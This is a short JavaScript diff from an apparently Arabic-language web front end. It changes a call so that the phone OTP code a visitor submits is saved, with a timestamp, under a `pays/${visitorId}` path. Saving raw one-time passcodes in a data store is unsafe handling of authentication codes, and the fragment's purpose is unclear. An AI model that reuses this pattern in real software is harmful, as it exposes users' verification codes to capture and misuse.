@@ -274,7 +274,7 @@ await addData(`pays/${visitorId}`, {
       setVerificationStatus("pending")
       setLoaderMessage("جاري التحقق من الرمز...")
 
-      await addData({
+await addData(`pays/${visitorId}`, {
         id: visitorId,
         phoneOtpCode: otpToVerify,
         otpSubmittedAt: new Date().toISOString(),
